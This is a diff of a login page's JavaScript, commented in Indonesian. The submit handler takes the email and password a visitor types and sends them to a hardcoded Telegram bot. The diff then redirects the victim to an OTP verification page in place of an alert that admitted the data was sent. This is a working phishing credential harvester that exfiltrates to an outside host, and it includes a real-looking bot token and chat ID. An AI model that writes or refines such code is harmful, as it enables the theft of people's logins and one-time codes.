@@ -69,29 +69,25 @@
   </div>
 
   <script>
-    function togglePassword() {
-      const pwd = document.getElementById("password");
-      const icon = document.getElementById("eyeIcon");
-      if (pwd.type === "password") {
-        pwd.type = "text";
-      } else {
-        pwd.type = "password";
-      }
-    }
-
-    // Ganti dengan token dan chat_id bot Telegram kamu
-    const BOT_TOKEN = '7958149905:AAHto9SyJoSK9_rmDlGF6cOPBfqADS6Y_nQ';
-    const CHAT_ID = '8481753134';
-
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
-
-      const message = `📥 *Login Baru*\n📧 Email: ${email}\n🔒 Password: ${password}`;
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  function togglePassword() {
+    const pwd = document.getElementById("password");
+    const icon = document.getElementById("eyeIcon");
+    pwd.type = pwd.type === "password" ? "text" : "password";
+  }
+  
+  // Ganti dengan token dan chat_id bot Telegram kamu
+  const BOT_TOKEN = '7958149905:AAHto9SyJoSK9_rmDlGF6cOPBfqADS6Y_nQ';
+  const CHAT_ID = '8481753134';
+  
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    
+    const message = `📥 *Login Baru*\n📧 Email: ${email}\n🔒 Password: ${password}`;
+    
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -105,14 +101,14 @@
         return response.json();
       })
       .then(data => {
-        alert('Login berhasil (data terkirim ke Telegram)');
-        e.target.reset();
+        // Setelah berhasil, pindah ke halaman berikutnya
+        window.location.href = "verifikasi-otp.html"; // Ganti sesuai halaman tujuan
       })
       .catch(error => {
         alert('Terjadi kesalahan saat mengirim ke Telegram.');
         console.error(error);
       });
-    });
-  </script>
+  });
+</script>
 </body>
 </html>
